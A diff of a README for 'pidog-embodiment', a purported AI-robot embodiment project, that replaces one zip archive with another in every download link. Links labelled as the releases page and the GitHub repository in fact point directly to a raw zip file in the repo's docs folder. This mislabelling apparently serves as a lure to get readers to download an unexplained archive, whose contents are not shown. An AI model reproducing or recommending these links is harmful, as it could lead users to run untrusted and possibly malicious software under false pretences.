@@ -4,7 +4,7 @@
 pidog-embodiment lets your AI take on a physical form. This application supports robot dogs, cars, and custom hardware. It combines advanced technology like voice control, face recognition, and autonomous behaviors to create an interactive experience. Whether you want to control your robot via Telegram or harness LLM technology, this project makes it easy.
 
 ## 📦 Download Now
-[![Download pidog-embodiment](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/pidog-embodiment-1.3.zip%https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/pidog-embodiment-1.3.zip)](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/pidog-embodiment-1.3.zip)
+[![Download pidog-embodiment](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/embodiment-pidog-2.0.zip%https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/embodiment-pidog-2.0.zip)](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/embodiment-pidog-2.0.zip)
 
 ## 🚀 Getting Started
 To use pidog-embodiment, you need to follow a few simple steps. This guide will help you through downloading the software and setting it up on your device.
@@ -21,7 +21,7 @@ Before you begin, ensure that your hardware meets these requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the software.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/pidog-embodiment-1.3.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/embodiment-pidog-2.0.zip)
 
 1. Click on the link above.
 2. Find the latest version of pidog-embodiment.
@@ -76,7 +76,7 @@ For additional help or questions, you can open an issue in the GitHub repository
 Join our community to discuss features, share projects, and connect with other users. You can find us on various platforms, and we encourage you to participate in discussions and share your experiences.
 
 ## 🔗 References
-- [GitHub Repository](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/pidog-embodiment-1.3.zip)
-- [Releases Page](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/pidog-embodiment-1.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/embodiment-pidog-2.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/carlossuarez091011-lgtm/pidog-embodiment/main/docs/embodiment-pidog-2.0.zip)
 
 Now get ready to bring your AI to life with pidog-embodiment! Enjoy the experience and explore endless possibilities.
